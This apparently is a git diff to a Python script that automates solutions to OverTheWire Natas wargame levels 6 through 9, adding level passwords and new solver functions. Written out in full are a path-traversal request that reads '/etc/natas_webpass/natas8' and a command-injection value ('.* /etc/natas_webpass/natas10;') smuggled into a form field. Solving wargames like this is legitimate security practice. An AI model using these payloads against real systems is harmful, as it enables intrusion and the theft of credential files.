@@ -1,6 +1,6 @@
 import requests
 from bs4 import BeautifulSoup
-import re, os
+import re, os, base64
 import html
 
 url = {
@@ -37,10 +37,10 @@ password = {
     "natas4": "tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm",
     "natas5": "Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD",
     "natas6": "fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR",
-    "natas7": "",
-    "natas8": "",
-    "natas9": "",
-    "natas10": ""
+    "natas7": "jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr",
+    "natas8": "a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB",
+    "natas9": "Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd",
+    "natas10": "D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE"
 }
 
 
@@ -142,50 +142,52 @@ def natas5():
     print(soup.body)
 
 def natas6():
-    response = requests.get(url["natas6"], auth=(username["natas6"], password["natas4"]))
-
-    div_content = soup.find('body').find('div', {'id': 'content'})
-    print(f'{div_content}\n')
-
-    # get source code
-    response = requests.get(url["natas6"] + 'index-source.html')
-    # the response contains the source code as encoded html file, e.g. &lt; which should've been <br
-    # therefore, we can use html.unescape() to decoded the html file
-    source = html.unescape(response.text).replace('<br />', '')
-    # html.parser didn't manage to find the div tag with id=content
-    # I think it's because the closing tag contains id property, which is not valid
-    # reference: https://stackoverflow.com/questions/8887015/closing-tag-with-id-property
-    soup = BeautifulSoup(source, 'lxml')
-    div = soup.find('div').prettify()
-    print(f'{div}\n')
-
-    # as we can see from the source code, specifically from the php code,
-    # there is a filepath to includes/secret.inc
-    # let's find out the content of the file
-    response = session.get(URL + 'includes/secret.inc')
-    print(response.text)
-    # although the includes directory is properly protected with access control
-    # the file secret.inc is accessible
-
-    """
-    From burpsuite:
-    secret=FOEIUWGHFEEUHOFUOIU&submit=Submit+Query
-    """
-    # therefore, we need to use both 'secret' and 'submit' as the keys to the data
-    # that we will send through the POST request
-    regex_search = re.search(r'\$(\w+) = "(\w+)";', response.text)
-    data = {
-        regex_search.group(1): regex_search.group(2),
-        # submit accepts any value, here, I just simply follow the value used by burpsuite
-        'submit': 'Submit+Query'
-    }
-    response = session.post(URL, data=data)
+    # incomplete automation
+    response = requests.get(url["natas6"], auth=(username["natas6"], password["natas6"]))
     soup = BeautifulSoup(response.text, 'html.parser')
-    div_content = soup.body.find(id='content')
-    # natas7 password: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
-    password = re.search(r'is (\w+)', str(div_content)).group(1)
-    print(f'natas7 password: {password}')
+    print(soup.body)
+    response2 = requests.post((url["natas6"] + "/index-source.html"), auth=(username["natas6"], password["natas6"]))
+    soup2 = BeautifulSoup(response2.text, 'html.parser')
+    print(soup2.text)
+    response3 = requests.post((url["natas6"] + "/includes/secret.inc"), auth=(username["natas6"], password["natas6"]))
+    soup3 = BeautifulSoup(response3.text, 'html.parser')
+    print(soup3.text)
 
+def natas7():
+    response = requests.get(url["natas7"], auth=(username["natas7"], password["natas7"]))
+    soup = BeautifulSoup(response.text, 'html.parser')
+    print(soup.body)
+    response2 = requests.post((url["natas7"] + "/index.php?page=../../../../etc/natas_webpass/natas8"), auth=(username["natas7"], password["natas7"]))
+    soup2 = BeautifulSoup(response2.text, 'html.parser')
+    print(soup2.text)
+
+def natas8():
+    # incomplete automation
+    response = requests.get(url["natas8"], auth=(username["natas8"], password["natas8"]))
+    soup = BeautifulSoup(response.text, 'html.parser')
+    print(soup.body)
+    response2 = requests.post((url["natas8"] + "/index-source.html"), auth=(username["natas8"], password["natas8"]))
+    soup2 = BeautifulSoup(response2.text, 'html.parser')
+    print(soup2.text)
+    encodedSecret = "3d3d516343746d4d6d6c315669563362"
+    ascii_encodedSecret = bytes.fromhex(encodedSecret).decode()[::-1]
+    decodedSecret = base64.b64decode(ascii_encodedSecret).decode()
+    print(f'{decodedSecret}\n')
+
+def natas9():
+    response = requests.get(url["natas9"], auth=(username["natas9"], password["natas9"]))
+    soup = BeautifulSoup(response.text, 'html.parser')
+    print(soup.body)
+    response2 = requests.post((url["natas9"] + "/index-source.html"), auth=(username["natas9"], password["natas9"]))
+    soup2 = BeautifulSoup(response2.text, 'html.parser')
+    print(soup2.text)
+    data = {
+        'needle': '.* /etc/natas_webpass/natas10;',
+        'submit': 'submit'
+    }
+    response3 = requests.post(url["natas9"], auth=(username["natas9"], password["natas9"]), data=data)
+    soup3 = BeautifulSoup(response3.text, 'html.parser').body.find('div', {'id' : 'content'})
+    print(f'{soup3}\n')
 
 # natas0()
 # natas1()
@@ -193,6 +195,8 @@ def natas6():
 # natas3()
 # natas4()
 # natas5()
-natas6()
-
-
+# natas6()
+# natas7()
+# natas8()
+natas9()
+# natas10()
